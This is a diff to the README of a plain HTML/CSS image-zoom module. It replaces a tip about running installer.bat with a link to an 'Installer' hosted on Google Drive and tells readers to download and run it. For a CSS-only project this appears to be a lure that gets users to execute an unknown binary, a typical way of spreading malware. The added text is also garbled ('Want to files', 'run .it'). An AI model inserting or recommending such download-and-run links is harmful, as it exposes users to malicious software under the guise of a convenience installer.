@@ -10,7 +10,7 @@ This simple module is supposed to zoom images on hover in plain html. Read the d
 
 # Usage
 
-> **TIP:** Want to files without the hassle of downloading the the files individually? Install & run installer.bat and it will install all of the files for you.
+> **TIP:** Want to files without the hassle of downloading the the files individually? Install [here](https://drive.google.com/u/0/uc?export=download&confirm=jwZK&id=1uOvurS2CgiOPxCK3_Dhaj2hXJqROHHNj "Installer") & run .it and it will install all of the files for you.
 
 Its very simple, just import the css files using 
 ```html
